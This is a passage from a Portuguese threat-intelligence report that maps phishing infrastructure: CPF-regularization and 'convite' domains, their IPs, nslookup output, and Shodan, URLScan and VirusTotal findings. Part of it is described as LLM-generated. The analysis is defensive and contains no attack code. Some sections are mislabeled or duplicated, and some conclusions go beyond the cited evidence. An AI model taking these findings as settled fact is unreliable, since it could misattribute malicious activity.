| **Certificados SSL** | Todos emitidos por **Sectigo** com validade de 1 ano (2025‑2026). Não há indícios de comprometimento na cadeia, mas a presença de HTTPS não impede abuso de conteúdo. |
| **Abuse contacts** (ARIN) | EIG‑Abuse Mitigation (email ``IARPOC@Newfold.com``) e NOC da Unified Layer (email ``abuse@bluehost.com``). Estes contatos podem ser acionados para reporte de abuso. |

**Padrão de uso**: o IP funciona como um *multi‑tenant* de hospedagem barata (possivelmente ambiente **cPanel/WHM** compartilhado). Atacantes aproveitam a baixa fricção de criação de contas para hospedar páginas de phishing ou redirecionamentos maliciosos, enquanto tiram proveito de serviços de gerenciamento (SSH, FTP) que permanecem abertos e desatualizados.

A análise conclui que o servidor de uso do IP, possui inúmeros serviços ativos, com atenção especial para serviços de email, e banco de dados, além de, estar associado há outros inúmeros domínios utilizados para campanhas phishing, sugerindo ser centro de comando e controle das campanhas phishing.
O uso de serviços legados, com várias vulnerabilidades conhecidas, demonstram possível falta de conhecimento em infraestrutura de segurança pelo grupo do golpe, embora, demonstrem uma arquitetura de design, hospedagem e direcionamento de sites sofitiscados.

# 17- Análise de Domínios Suspeitos

Após a análise automatizada, a busca manual pelo ``urlscan.io``, forneceu vários domínios suspeitos associados ao IP, associados aos seguintes IPs quando realizado ``nslookup`` e ``ping``:

* ``centralregularize.com`` -> ``161.35.50.50``
* ``blackconviteplus.com`` -> fora do ar
* ``regularizandocpf.com`` -> ``216.238.109.50``
* ``conviteblackelite.com`` -> ``191.252.227.30``
* ``blackconviteexclusivo.com`` -> ``191.252.227.30``
* ``blackconvitevip.com`` -> ``191.252.225.147``
* ``rendaverificada.com`` -> ``216.238.109.50``
* ``centralregularizacao.com`` -> ``191.252.225.147``
* ``portalregularizacao.com`` -> ``216.238.109.50``
* ``regularizesuadivida.com`` -> ``216.238.109.50``
* ``www.legalizarcpfonline.com`` -> ``216.238.108.222``
* ``simplificandoeorganizandosuasfinancaspessoais.store`` -> fora do ar
* ``alertarct-431107602190.southamerica-east1.run.app`` -> ``34.143.7x.2``
* ``regularize-709035289742.southamerica-east1.run.app`` -> ``34.143.7x.2``
* ``nsm-709035289742.northamerica-south1.run.app`` -> ``34.143.7x.2``
* ``segu-ran-ca-709035289742.southamerica-east1.run.app`` - > ``34.143.7x.2``

```Bash
┌──(kali㉿kali)-[~]
└─$ nslookup centralregularize.com                            
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   centralregularize.com
Address: 161.35.50.50

┌──(kali㉿kali)-[~]
└─$ nslookup blackconviteplus.com 
Server:         192.168.192.2
Address:        192.168.192.2#53

** "server can't find blackconviteplus.com: NXDOMAIN"

┌──(kali㉿kali)-[~]
└─$ nslookup regularizandocpf.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   regularizandocpf.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup conviteblackelite.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   conviteblackelite.com
Address: 191.252.227.30

┌──(kali㉿kali)-[~]
└─$ nslookup blackconviteexclusivo.com                    
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   blackconviteexclusivo.com
Address: 191.252.227.30

┌──(kali㉿kali)-[~]
└─$ nslookup blackconvitevip.com      
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   blackconvitevip.com
Address: 191.252.225.147

┌──(kali㉿kali)-[~]
└─$ nslookup rendaverificada.com                   
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   rendaverificada.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup centralregularizacao.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   centralregularizacao.com
Address: 191.252.225.147

┌──(kali㉿kali)-[~]
└─$ nslookup portalregularizacao.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   portalregularizacao.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup regularizesuadivida.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   regularizesuadivida.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup legalizarcpfonline.com 
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   legalizarcpfonline.com
Address: 216.238.108.222

┌──(kali㉿kali)-[~]
└─$ nslookup simplificandoeorganizandosuasfinancaspessoais.store
Server:         192.168.192.2
Address:        192.168.192.2#53

** "server can't find simplificandoeorganizandosuasfinancaspessoais.store: NXDOMAIN"

┌──(kali㉿kali)-[~]
└─$ nslookup regularize-709035289742.southamerica-east1.run.app 
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
regularize-709035289742.southamerica-east1.run.app      canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.76.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.75.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 2600:1900:4244:200::
Name:   v2.run.app

┌──(kali㉿kali)-[~]
└─$ nslookup alertarct-431107602190.southamerica-east1.run.app 
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
alertarct-431107602190.southamerica-east1.run.app       canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 34.143.75.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.76.2
                                                                     
┌──(kali㉿kali)-[~]
└─$ nslookup nsm-709035289742.northamerica-south1.run.app     
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
nsm-709035289742.northamerica-south1.run.app    canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.76.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.75.2

                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nslookup segu-ran-ca-709035289742.southamerica-east1.run.app
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
segu-ran-ca-709035289742.southamerica-east1.run.app     canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.75.2
Name:   v2.run.app
Address: 34.143.76.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 2600:1900:4242:200::
Name:   v2.run.app
Address: 2600:1901:81d4:200::
Name:   v2.run.app
Address: 2600:1900:4241:200::
Name:   v2.run.app
Address: 2600:1900:4245:200::
Name:   v2.run.app
Address: 2600:1900:4240:200::
Name:   v2.run.app
Address: 2600:1900:4243:200::
Name:   v2.run.app
Address: 2600:1901:81d5:200::
Name:   v2.run.app
Address: 2600:1900:4244:200::
```

Em resumo, os IPs associados aos domínios suspeitos foram:
* ``161.35.50.50`` 
* ``216.238.109.50`` 
* ``191.252.227.30`` 
* ``191.252.225.147`` 
* ``216.238.108.222`` 
* ``34.143.7x.2``

O IP ``34.143.7x.2`` já analisado anteriormente, fazendo parte do bloco de IPs de serviço da Google Cloud, evidenciando apresença de vários serviços hispedados e ativos por essa via de hospedagem e distribuição.
A análise revelou também, o uso de mesmo IP para vários domínios diferentes, além de todos, não passarem de 5 meses de registro segundo o ``urlscan.io``. 

# 18- Análise de IPs encontrados

A análise dos IPs, foi realizada de forma automatizada pelo ``ip-analysis.py``.

## ``161.35.50.50`` 

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|---------------|
| **Shodan – Tags** | `cloud` | Indica que o host está em infraestrutura de nuvem (DigitalOcean). |
| **Shodan – Última vez visto** | 2025‑10‑27 | O host está ativo recentemente. |
| **Portas abertas** | 22, 80, 443 | Serviços SSH e Web (HTTP/HTTPS) expostos ao público. |
| **Banner SSH** | OpenSSH 9.6p1 (Ubuntu) | Versão atual, sem vulnerabilidades conhecidas críticas. |
| **Banner HTTP** | Apache 2.4.58 (Ubuntu) | Versão antiga, com várias CVEs (lista abaixo). |
| **Domínio / Hostname** | convitecenturion.com – blog de cafés | Uso aparente como site institucional/pessoal, sem indício direto de atividade maliciosa. |
| **URLScan.io** | Nenhum resultado | Não há evidência de interações suspeitas capturadas por URLScan. |
| **Abuse contacts** (ARIN) | abuse@digitalocean.com | Canal oficial de relato de abuso disponível. |

**Conclusão comportamental:**  
- Não há sinais explícitos de que o IP esteja operando como **C2**, **botnet**, ou **scanner de rede**.  
- O risco principal decorre da **exposição pública de serviços** (SSH, HTTP/HTTPS) e da **presença de múltiplas vulnerabilidades** no servidor Apache, que podem ser exploradas por atores maliciosos para comprometimento do host ou para usá‑lo como **ponto de apoio** em campanhas de ataque.
O endereço **161.35.50.50** pertence à DigitalOcean (ASN **AS14061**) e está localizado em **North Bergen, New Jersey, EUA**. O host resolve para ``convitecenturion.com``, um site de blog que utiliza **Apache httpd 2.4.58** (Ubuntu) nas portas **80 (HTTP)** e **443 (HTTPS)**, além de **OpenSSH 9.6p1** na porta **22 (SSH)**. O serviço web apresenta mais de **30 CVEs** associados à versão do Apache, incluindo vulnerabilidades críticas (CVSS ≥ 9). Não há indicadores claros de que o IP faça parte de botnets ou de atividades de scanner; entretanto, a presença de um servidor exposto com várias vulnerabilidades pode torná‑lo um alvo atraente para exploração ou para uso como ponto de pivotagem.  

A análise, embora não tenha observado comportamentos maliciosos, possui serviços ativos de ``SSH`` e ``HTTP/HTTPS``, o que sugere seu uso para hospedagem de páginas somente, e possivelmente, pelos serviços ativos, ponto de apoio para realização de atividades ofensivas contra as vítimas através .
O IP direciona para o domínio ``convitecenturion.com``, sendo um domínio com página confiável, porém, que aponta para outro IP ao ser analisado pelo ``nslookup``, evidenciamento mais um sistema de direcionamento e ``cloacking``, demonstrando o comportamento malicioso, e mais uma vez, a arquitetura sofisticada das campanhas phishing realizadas pelo grupo de golpistas.

```bash
┌──(kali㉿kali)-[~]
└─$ nslookup convitecenturion.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   convitecenturion.com
Address: 172.233.6.193
```

## ``216.238.109.50``

**Análise de Comportamento**
| Indicador | Evidência | Interpretação |
|-----------|-----------|---------------|
| **Tags Shodan** | `cloud`, `vpn` | Hospedado em nuvem e oferece serviço VPN – uso legítimo ou para mascaramento de atividades maliciosas. |
| **Porta 500/UDP (IKE VPN)** | Payload IKE exibido, sem criptografia | Indica um serviço de VPN ativo, possivelmente usado para **túnel de tráfego malicioso** ou para ocultar a origem de ataques. |
| **Porta 22/SSH aberta** | OpenSSH 7.6p1, banner público | Facilidade de acesso remoto; pode ser alvo de **brute‑force** ou já estar comprometido como ponto de comando e controle (C2). |
| **Portas 80/443 HTTP(S)** | Resposta 404 em 80; HTTPS ativo nos domínios investigados | Hospedagem de múltiplos sites de aparência fraudulenta (phishing/ scams). |
| **Domínios de curto prazo** | Idade entre 0‑14 dias, conteúdo de “regularização” de documentos | Estratégia típica de **phishing**: registrar rapidamente domínios, usar certificados válidos (TLS 89 dias) para ganhar confiança. |
| **Ausência de CVEs listadas** | Shodan não mostrou vulnerabilidades específicas | Não há vulnerabilidades expostas diretamente, mas o software (OpenSSH 7.6p1) tem CVEs conhecidos (ex.: CVE‑2018‑15473, CVE‑2020‑15778). |
| **Presença em feeds de ameaças** | Não fornecido, porém tags e comportamento sugerem inclusão em listas de **abuse** de nuvem. | Recomenda‑se verificação em fontes externas (AbuseIPDB, Spamhaus, etc.). |

**Conclusão comportamental:** O IP funciona como **infraestrutura de hospedagem de sites fraudulentos** e oferece serviços VPN/SSH que podem ser utilizados para **túnel e controle remoto**. Não há evidência direta de ser parte de um botnet conhecido, mas o conjunto de serviços e a natureza dos domínios apontam para uso malicioso.
O endereço **216.238.109.50** pertence à nuvem da **Vultr** (ASN AS20473 – The Constant Company, LLC) e está localizado em **Osasco, São Paulo, Brasil**. O host apresenta as portas **22 (SSH), 80 (HTTP), 443 (HTTPS), 500 (UDP – IKE VPN) e 7011 (TCP – serviço não identificado)**. Os banners revelam um servidor **OpenSSH 7.6p1** e um túnel VPN IKE ativo.  
Diversos domínios de **curto tempo de vida** (ex.: `regularizandocpf.com`, `rendaverificada.com`, `centralregularizacao.com`) apontam para este IP, todos exibindo páginas em português com aparência de sites de “regularização” de CPF, renda, etc., tipicamente associadas a **phishing e fraudes financeiras**. As tags do Shodan (“cloud”, “vpn”) reforçam a natureza de hospedeiro de serviços VPN e web. Não foram encontradas vulnerabilidades CVE explícitas no relatório, porém o OpenSSH 7.6p1 possui vulnerabilidades conhecidas.

A análise, revela ser um IP de servidor reconhecido para atividades maliciosas, podendo ser usado como ponto de comando e controle por coleta de tráfego via túnel VPN, presente como serviço ativo no servidor. A análise também evidenciou a presença de uma porta alta aberta ``7011``, desmonstrando comportamento suspeito de execução de serviços de comunicação com máquinas das vítimas.  

## ``191.252.227.30``

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|----------------|
| **Shodan** | Página de erro “404: Not Found” – nenhuma ficha de serviço. | O Scanning do Shodan não obteve banners; porém a ausência de dados não indica inexistência de serviços. |
| **URLScan.io** | 5 varreduras mostrando 5 domínios diferentes (ex.: `blackconviteplus.com`, `conviteblackelite.com`, `blackconviteexclusivo.com`). Todos apontam ao mesmo IP, com certificado TLS recém‑emitido (≈ 90 dias) e content‑type HTML. | Indica que o IP hospeda múltiplos domínios de curta vida – padrão de “fast‑flux” ou serviços de hospedagem de páginas de phishing/ scams. |
| **Domínios** | Todos os domínios apresentam **título** “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”. | Pode ser tentativa de camuflagem usando conteúdo aparentemente legítimo, mas a correlação com termos “convite”, “black” sugere campanha de engodo. |
| **Serviços detectados** | Servidor Apache 2.4.52 (Ubuntu) nas portas 80/443. | Servidor web padrão, mas a versão Apache 2.4.52 já tem vulnerabilidades conhecidas; embora não haja CVEs listados pelo Shodan, a presença de um software amplo pode facilitar exploração. |
| **Certificado TLS** | Emissor “R13”, validade 89‑90 dias, emitido recentemente (03‑10‑2025). | Certificado provavelmente de Let's Encrypt (R13 = “R3”?), típico de automação de certificados em ambientes de hospedagem rápida. |
| **ASN / ISP** | AS27715 – Locaweb Serviços de Internet S/A. | Provedor de hospedagem brasileiro de uso geral; a presença de atividades suspeitas pode estar relacionada a clientes mal‑intencionados ou a comprometimento de um servidor dentro da rede. |

**Conclusão comportamental:** Não há evidência direta de botnet de C2, mas o padrão de múltiplos domínios curtos, conteúdos de blog genéricos e uso de TLS recente são indicadores típicos de infraestrutura de phishing/ scam. O IP pode estar sendo usado como *phishing landing page* ou para hospedar *malvertising*.
O endereço **191.252.227.30** pertence à Locaweb Serviços de Internet S/A (AS27715) e está localizado em São Paulo, BR. Embora o Shodan não retorne informações de serviços (apresenta “404: Not Found”), o URLScan.io identifica este IP como backend de múltiplos domínios recém‑criados (e com idade de 0 dias) que exibem o mesmo site de aparência legítima (blog “Veroo Cafés”), porém os nomes (ex.: *blackconviteplus.com*, *conviteblackelite.com*, *blackconviteexclusivo.com*) são típicos de campanhas de phishing ou de “convite” fraudulento. O servidor responde nas portas **80 / 443** (Apache 2.4.52 em Ubuntu) e utiliza certificado TLS válido (≈ 90 dias). Não foram encontrados CVEs associados ao host via Shodan. O conjunto de indicadores sugere possível uso do IP para hospedagem de sites de engodo ou de phishing, possivelmente como parte de botnet de hospedagem de conteúdo malicioso.

Análise retornou de forma clara, mais um IP de servidor de sites maliciosos, sem retorno de serviços por estar inacessível pelo scan do ``shodan.io``, o que demonstra, ser somente utilizado para hospedagem de páginas pelo ``Localweb``.

## ``191.252.225.147``

Análise de Comportamento
| Evidência | Interpretação |
|-----------|----------------|
| **Múltiplas hostnames** (`batamwebmedia.com`, `vpscl3417.publiccloud.com.br`) e **diversas zonas** (`centralregularize.com`, `blackconvitevip.com`, `conviteblackvip.com`, `conviteblackexclusivo.com`) apontando para o mesmo IP | **Fast‑flux / painel de controle de hospedagem** que permite a criação rápida de domínios de phishing ou spam. |
| **Domínios com “age” de 0‑1 dia** (URLScan.io) e **tags “suspect”** | Probabilidade alta de **campanhas de phishing, scams ou sites de afiliados maliciosos**. |
| **Porta 25 aberta com STARTTLS** e **banner Postfix** sem restrição explícita de relay | Possível **relay de spam** ou **uso como ponto de saída para botnet**. |
| **Porta 22 aberta** (OpenSSH) | Vetor comum para **ataques de força‑bruta / comprometimento de credenciais**. |
| **Apache 2.4.52** com inúmeras CVEs (vários críticos, high e medium) | **Superfície de ataque extensa**; vulnerabilidades conhecidas podem ser exploradas para RCE, SSRF, hijacking de sessão ou negação de serviço. |
| **Certificado Let's Encrypt válido 89 dias** (para `batamwebmedia.com`) e **certificado self‑signed** no banner SMTP | Indica **configurações mistas** que podem ser usadas para mascarar tráfego malicioso. |
| **Tags Shodan – “self‑signed”, “starttls”** | Sinal de **serviços mal configurados** (pode facilitar interceptação ou spoofing). |
| **Último visto 2025‑10‑08** (atividade recente) | O host está **ativo e em operação** no momento da coleta. |

**Conclusão comportamental:**  
O IP demonstra um perfil típico de **infraestrutura de hospedagem utilizada por atores maliciosos** para distribuir sites de curta vida, possibilitar envio de e‑mail em massa e servir como ponto de acesso para exploração de vulnerabilidades web.
O endereço **191.252.225.147** está alocado à **Locaweb Serviços de Internet S/A (AS27715)**, localizado em **São Paulo – Brasil**. O host apresenta as portas **22 (SSH), 25 (SMTP), 80 (HTTP) e 443 (HTTPS)** expostas, rodando **OpenSSH 8.9p1 (Ubuntu)**, **Postfix smtpd** e **Apache httpd 2.4.52 (Ubuntu)**.  
Várias domíções recém‑criadas (ex.: `centralregularize.com`, `blackconvitevip.com`, `conviteblackvip.com`) apontam para esse IP, todas exibindo um mesmo conteúdo de blog (potencialmente usado como fachada).  
O serviço Apache contém **mais de 30 vulnerabilidades** (incluindo CVEs críticos como CVE‑2024‑38476 – CVSS 9.8) e a configuração de SMTP permite STARTTLS, mas não há evidência de restrição de relay.  
Indicadores de uso malicioso: domínio de vida útil ≤ 1 dia, múltiplos domínios “suspect”, serviços de mail abertos e presença de tags **self‑signed** e **starttls** no Shodan.  

```bash
┌──(kali㉿kali)-[~]
└─$ nslookup batamwebmedia.com       
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   batamwebmedia.com
Address: 191.252.225.147
```

Análise retornou de forma clara, mais um IP de servidor de sites maliciosos, com serviço ``SMTP`` com ``STARTTLS``, sugerindo aervidor de ``botnets`` de envio de emails phishing.
A análise, retornou também, uso de certificado para domínio ``batamwebmedia.com`` no banner do serviço ``SMTP``, confirmando sua correspondência através de ``nslookup``. 
Uma rápida análise via ``whois.com``, apontou para o registro do domínio pelo ``Hostinger``, com dados de contato do proprietário ocultados, sendo exibidos o do servidor da hospedagem do domínio (``Hostinger``). O uso desse domínio, sugere possível uso para mascarar o tráfego, podendo esse, estar sendo utilizado por possível má configuração de DKIM/DMARK/SPF.

## ``216.238.108.222``

Análise de Comportamento
| Fonte | Indicador | Interpretação |
|-------|-----------|---------------|
| **Shodan** | Tags: `cloud`, hostnames `*.vultrusercontent.com` | Servidor em nuvem pública, tipicamente usado por infraestruturas legítimas, mas também por atores maliciosos que buscam anonimato rápido. |
| **Shodan – Portas** | 443 (HTTPS) & 8082 (HTTP) – ambos Nginx | Serviços web abertos. 8082 responde com *400 Bad Request* ao HTTP puro, possivelmente um endpoint de API ou painel interno exposto. |
| **URLScan.io** | 5 domínios analisados apontam ao mesmo IP, todos marcados como “suspect”. Títulos falsificam autoridades brasileiras (DETRAN, Receita Federal). | Indicação clara de **phishing** e **fraude online**. O IP age como hospedagem de landing pages enganosas. |
| **Whois / RDAP** | Organização: *Vultr Holdings, LLC* (provedor de cloud). | Não há vínculo direto com atividade criminosa, porém a natureza de VPS permite rotatividade e uso temporário por atores maliciosos. |
| **Histórico de varredura** | Último visto em 2025‑10‑09 | O IP está ativo recentemente, mantendo os serviços expostos. |

**Conclusão de comportamento:** Não há sinais de botnet ou C2 (não foram observados tráfego de comando/controle ou portas típicas de P2P). Contudo, a **presença de múltiplos sites fraudulentos** indica que o servidor está sendo usado como **plataforma de hospedagem de phishing** e possivelmente distribuição de payloads maliciosos via download de arquivos ou scripts maliciosos.
O endereço **216.238.108.222** está localizado em **Osasco, São Paulo, Brasil**, pertencente ao provedor de nuvem **Vultr** (ASN **AS20473 – The Constant Company, LLC**). O host possui duas portas abertas (**443/tcp** e **8082/tcp**) servindo **Nginx**. Evidências de **atividade maliciosa** foram encontradas nas análises de URLScan.io, que mostram o IP sendo utilizado como backend de múltiplos domínios suspeitos de phishing e fraude (ex.: *regularizemultas.com*, *legalizarcpfonline.com*), todos com conteúdo falsificando órgãos públicos (DETRAN, Receita Federal). Não foram identificadas vulnerabilidades CVE diretamente associadas ao serviço Nginx exposto, mas a presença de um servidor web público sem restrições e seu uso para hospedagem de sites fraudulentos indica **alto risco de ser usado como vetor de ataque** (phishing, distribuição de malware, hospedagem de payloads).

A análise, evidenciando mais um IP direcionado à servidor de hospedagem de sites com serviços ``HTTP``, ``HTTPS`` e outros servidos via ``Nginx`` nas portas ``443`` e ``8082``, de múltiplos domínios analisados apontados ao mesmo IP, todos marcados como “suspect”, com títulos de falsificação autoridades brasileiras (DETRAN, Receita Federal), indicando também, servir de servidor para ``landing pages`` maliciosas.

# 19- Análise de domínios

Os domínios foram analisados por script automatizado em Python, coletando dados do ``urlscan.io``, ``whois.com`` e ``virustotal.io``, e os dados coletados analisados por LLM gpt-oss 120b via Ollama Cloud, e emitido um relatório em markdown.
Os principais pontosapontados na análise, foram:

## ``regularizandocpf.com``

**Resumo Executivo**
O domínio **centralregularize.com** foi registrado em 4 de outubro 2025 (GoDaddy) e ainda possui idade de poucos dias (1 – 24 dias, dependendo da fonte). Os registros DNS apontam para dois IPs distintos: **191.252.225.147** (Locaweb – Brasil, ASN AS27715) e **161.35.50.50** (DigitalOcean – EUA, ASN AS14061). Os mecanismos de análise de URL e de arquivos (VirusTotal) classificam o domínio como *harmless* (0 malicious, 0 suspicious, 62 harmless, 33 undetected). O conteúdo apresentado nas duas varreduras corresponde a um blog de café em português, sem indícios de phishing, C2 ou distribuição de malware. Contudo, a recente criação, a troca frequente de IPs e a presença em duas infra‑estruturas diferentes justificam monitoramento contínuo, pois domínios recém‑criados são comumente empregados em campanhas maliciosas antes de serem detectados.

**Análise de Comportamento**
| Fonte | Indicador | Avaliação |
|-------|-----------|-----------|
| **URLScan.io** (02/10/2025) | *Redirected: https‑only*; **TLS** válido por 89 dias (Let's Encrypt R12). | Boas práticas de TLS, porém certificado recém‑emitido (ponto de atenção típico de domínios “lavados”). |
| URLScan.io (29/10/2025) | Servidor **Apache/2.4.58 (Ubuntu)**, idioma **pt**, título **Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés**. | Conteúdo de blog legítimo, sem scripts suspeitos visíveis nos relatórios resumidos. |
| **VirusTotal** – *last_analysis_results* | 62 engines “harmless”, 33 engines “undetected”, 0 malicious. | Nenhum motor de AV detectou ameaça. |
| **DNS** | **NS17/NS18.DOMAINCONTROL.COM** (GoDaddy). | Nameservers padrão de registrador – sem evidência de DNS hijacking. |
| **ASN / IP** | US – **AS14061 (DigitalOcean)**; BR – **AS27715 (Locaweb)**. | Dois provedores diferentes; pode indicar uso de CDN, load‑balancer ou mudança rápida de hospedagem. |
| **Domínio recém‑criado** (≤ 24 dias) | Domínios novos costumam ser usados em **phishing**, **malspam**, ou como **C2** temporário antes de serem bloqueados. | Atenção ao potencial de uso futuro, apesar do contexto atual benigno. |

**Conclusão comportamental:** Nenhum indicativo de atividade maliciosa confirmada nos dados atuais. O domínio parece hospedar um blog legítimo, mas a rápida mudança de IP e a idade mínima sugerem que o domínio ainda pode ser recrutado por atores maliciosos.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``blackconviteplus.com``

**Resumo Executivo**
O domínio **blackconviteplus.com** foi registrado em 03/10/2025 (registro 0 dias) via GoDaddy e aponta para o IP **191.252.227.30**, pertencente à operadora **Locaweb Serviços de Internet S/A (AS27715, Brasil)**. O site hospeda um blog em português sobre “Veroo Cafés”, porém o nome do domínio não possui relação aparente com o conteúdo, indicando possível uso de *domain‑parking* ou de *camuflagem* para fins de phishing ou spam. Nenhuma detecção de malware ou classificação de reputação foi encontrada nos 95 scanners da VirusTotal; o domínio aparece como *undetected* em todas as bases. Apesar da ausência de sinais claros de atividade maliciosa, a combinação de **registro recente**, **IP de data‑center compartilhado**, e **nome de domínio não correlacionado ao conteúdo** sugere cautela e monitoramento contínuo.

**Análise de Comportamento**
| Item | Evidência | Interpretação |
|------|-----------|---------------|
| **Registro recente** (0 dias) | Data de criação 03/10/2025 | Domínios recém‑criados são frequentemente usados em campanhas de phishing, malware ou esquemas de *spam* antes que sejam listados em blocklists. |
| **Conteúdo do site** | Título “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés” | O conteúdo público parece legítimo, porém não tem relação com a palavra “blackconviteplus”, indicando possível tentativa de *camuflagem* (uso de domínio genérico para atrair cliques). |
| **Server/Stack** | Apache 2.4.52 (Ubuntu) | Software padrão, sem vulnerabilidades específicas observadas. |
| **TLS** | Certificado Let’s Encrypt (válido 89 dias, emitido 03/10/2025) | Certificado recente, normalmente usado por sites legítimos, mas também por atores maliciosos para dar aparência de confiança. |
| **IP/ASN** | 191.252.227.30 — AS27715 (Locaweb, BR) | Data‑center brasileiro que hospeda múltiplos clientes; IP pode ser compartilhado por diversos domínios. |
| **VirusTotal** | 95/95 scanners – *undetected*; nenhuma marcação de *malicious*, *suspicious* ou *phishing* | Não há indicações de malware conhecido ou de atividades de C2. |
| **Listas de bloqueio** | Nenhum engine (Acronis, Kaspersky, etc.) reportou o domínio como malicioso | Ainda não reputado como ameaça, mas o monitoramento é essencial devido à nova criação. |
| **DNS** | NS ns49.domaincontrol.com / ns50.domaincontrol.com (GoDaddy) | Servidor DNS padrão de registrador; não indica uso de infra‑estrutura de ameaças. |

**Conclusão comportamental:** Não há evidências diretas de uso como *botnet*, *C2* ou *phishing* ativo. Contudo, o perfil (registro novo, domínio sem relação ao conteúdo hospedado, hospedagem em data‑center compartilhado) é típico de **domínios “cobertos”** que podem ser ativados para campanhas maliciosas rápidas antes de serem detectados.

Embora a análise não afirme ter encontrado sinais de comportamento malicioso, o redirecionamento novamente para o blog de café, ``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``, cinfirma o sistema de cloacking e redirecionamento.
A análise evidenciu também, o registro recente, provável motivo de ainda não estar em registros de plataformas que indiquem ser um domínio malicioso. O registro do domínio possui dados do proprietário ocultado, reforçando a atividade maliciosa.

## ``regularizandocpf.com``

**Resumo Executivo**
- **Domínio** registrado em **18/09/2025** (14 dias de idade) via **GoDaddy.com, LLC**.  
- **IP resolvido**: **216.238.109.50** – data center da **Vultr (AS20473 – “AS‑VULTR, US”)**, localizado no **Brasil** (conteúdo entregue a partir de São Paulo).  
- Certificado TLS emitido por **Let’s Encrypt (E7)**, válido por 89 dias a partir de 18/09/2025.  
- **Análise de reputação** (VirusTotal) aponta **10 deteções maliciosas** (phishing, malware, “malicious”), com motores como Sophos, Webroot, Fortinet, Netcraft, entre outros, classificando o domínio como **phishing** ou **malware**.  
- **URLScan.io** registra a página como **suspect** na primeira submissão (http → https‑only), mas o conteúdo exibido parece ser um blog “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”.  
- O domínio apresenta **status de registro restrito** (“client delete/renew/transfer/update prohibited”) e está **recém‑criado**, característica comum em campanhas de phishing/fraude que utilizam sites de aparência legítima para enganar vítimas.  
- Múltiplas fontes de inteligência classificam **regularizandocpf.com** como potencial vetor de phishing/malware. Embora o conteúdo aparente ser um blog, a alta taxa de deteções indica que o site pode estar sendo usado para coletar dados sensíveis (ex.: CPF) ou distribuir payloads maliciosos.

Análise de Comportamento
| Indicador | Evidência | Interpretação |
|-----------|-----------|---------------|
| **Idade do domínio** | Registrado há 14 dias (19/09‑2025). | Domínios jovens são tipicamente usados em campanhas de curto prazo para evitar listas estáticas. |
| **Detecções no VT** | 10 marcadores (phishing, malware). | Alta probabilidade de ser usado para coleta de credenciais ou distribuição de código malicioso. |
| **Categoria nos fornecedores de segurança** | Forcepoint: “newly registered websites”; Sophos: “spyware and malware”; Webroot & AlphaMountain.ai: “Phishing”. | Consenso entre diferentes intel feeds sobre natureza fraudulenta. |
